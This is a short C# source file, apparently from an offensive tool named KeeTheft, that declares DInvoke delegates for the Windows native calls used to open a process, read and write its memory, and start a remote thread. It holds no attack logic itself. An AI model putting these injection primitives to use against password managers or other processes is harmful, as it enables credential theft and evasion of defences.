using System;
using System.Runtime.InteropServices;

using DI = DInvoke;

namespace KeeTheft
{
    class Delegates
    {
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate DI.Data.Native.NTSTATUS NtOpenProcess(
            ref IntPtr ProcessHandle,
            DI.Data.Win32.Kernel32.ProcessAccessFlags DesiredAccess,
            ref Win32.OBJECT_ATTRIBUTES ObjectAttributes,
            ref Win32.CLIENT_ID ClientId);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate DI.Data.Native.NTSTATUS NtAllocateVirtualMemory(
            IntPtr ProcessHandle,
            ref IntPtr BaseAddress,
            IntPtr ZeroBits,
            ref IntPtr RegionSize,
            uint AllocationType,
            uint Protect);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate DI.Data.Native.NTSTATUS NtReadVirtualMemory(
            IntPtr ProcessHandle,
            IntPtr BaseAddress,
            IntPtr Buffer,
            uint NumberOfBytesToRead,
            ref uint NumberOfBytesReaded);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate DI.Data.Native.NTSTATUS NtWriteVirtualMemory(
            IntPtr ProcessHandle,
            IntPtr BaseAddress,
            IntPtr Buffer,
            uint BufferLength,
            ref uint BytesWritten);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate DI.Data.Native.NTSTATUS NtCreateThreadEx(
            ref IntPtr threadHandle,
            DI.Data.Win32.WinNT.ACCESS_MASK desiredAccess,
            IntPtr objectAttributes,
            IntPtr processHandle,
            IntPtr startAddress,
            IntPtr parameter,
            bool createSuspended,
            int stackZeroBits,
            int sizeOfStack,
            int maximumStackSize,
            IntPtr attributeList);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate bool CloseHandle(IntPtr hObject);
    }
}
